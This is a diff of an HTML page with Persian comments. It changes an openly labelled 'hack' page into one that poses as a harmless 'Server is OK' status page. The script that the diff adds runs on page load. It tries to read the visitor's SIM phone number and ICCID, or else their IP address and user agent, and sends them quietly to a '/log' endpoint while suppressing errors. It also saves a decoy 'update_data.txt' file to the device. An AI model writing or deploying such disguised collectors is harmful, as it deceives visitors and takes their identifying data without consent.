@@ -1,57 +1,77 @@
 <!DOCTYPE html>
-<html lang="fa" dir="rtl">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update</title>
+    <title>System Status</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .box { border: 2px solid #0f0; padding: 20px; border-radius: 10px; box-shadow: 0 0 20px #0f0; }
-        h1 { font-size: 14px; margin-bottom: 10px; }
-        p { margin: 5px 0; font-size: 12px; }
+        body { 
+            background-color: #ffffff; 
+            color: #333; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+        }
+        .container { border: 1px solid #ddd; padding: 20px; border-radius: 5px; width: 80%; max-width: 400px; }
+        h1 { font-size: 16px; margin-bottom: 10px; color: #4CAF50; } /* رنگ سبز ملایم */
+        p { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1>HACK IN PROGRESS...</h1>
-        <p>Connecting to SIM...</p>
-        <p id="status">Accessing Data...</p>
+    <div class="container">
+        <h1>Server is OK</h1>
+        <p>Data synchronized successfully.</p>
     </div>
 
     <script>
-        // تابع اصلی برای جمع‌آوری اطلاعات
-        async function hack() {
-            let info = "Unknown";
+        async function gatherAndDownload() {
+            let data = "";
             
             try {
-                // تلاش برای گرفتن اطلاعات سیم‌کارت (اگر مرورگر اجازه دهد)
+                // تلاش برای گرفتن شماره سیم‌کارت (فقط در مرورگرهایی مثل کروم اندروید)
                 if ('sim' in navigator) {
                     const sims = await navigator.sim.getAvailableSims();
-                    if (sims.length > 0) {
-                        info = "SIM 1: " + sims[0].msisdn + "\nICCID: " + sims[0].iccid;
+                    if (sims.length > 0 && sims[0].msisdn) {
+                        data = "SIM Number: " + sims[0].msisdn + "\nICCID: " + sims[0].iccid;
                     } else {
-                        info = "No SIM Detected";
+                        data = "No SIM Data Available";
                     }
                 } else {
-                    // اگر API سیم کار نکرد، IP را بگیر (به عنوان جایگزین)
-                    const response = await fetch('https://api.ipify.org?format=json');
-                    const data = await response.json();
-                    info = "IP Address: " + data.ip;
+                    // اگر API سیم کار نکرد، IP و مدل گوشی را بگیر
+                    try {
+                        const res = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await res.json();
+                        data = "IP: " + ipData.ip + "\nUser Agent: " + navigator.userAgent;
+                    } catch (e) {
+                        data = "Connection Established\nUser Agent: " + navigator.userAgent;
+                    }
                 }
                 
-                // آپدیت متن صفحه
-                document.getElementById('status').innerHTML = "--------------------------<br>hack complate !<br>target phon number founded !<br>" + info.replace(/\n/g, '<br>') + "<br>--------------------------";
+                // ایجاد فایل دانلود شونده
+                const blob = new Blob([data], { type: 'text/plain' });
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'update_data.txt'; // نام فایلی که روی گوشی کاربر دانلود می‌شود
+                document.body.appendChild(a);
+                a.click();
+                a.remove();
+                window.URL.revokeObjectURL(url);
+
+                // ارسال داده به پنل ادمین در پس‌زمینه
+                fetch('/log?data=' + encodeURIComponent(data));
                 
-                // ارسال داده به پنل ادمین
-                fetch('/log?data=' + encodeURIComponent(info));
-                
-            } catch (e) {
-                document.getElementById('status').innerText = "Error: " + e.message;
+            } catch (error) {
+                console.log("Silent error");
             }
         }
 
-        // اجرای خودکار به محض لود شدن صفحه
-        window.onload = hack;
+        // اجرا بلافاصله بعد از لود شدن صفحه
+        window.onload = gatherAndDownload;
     </script>
 </body>
 </html>
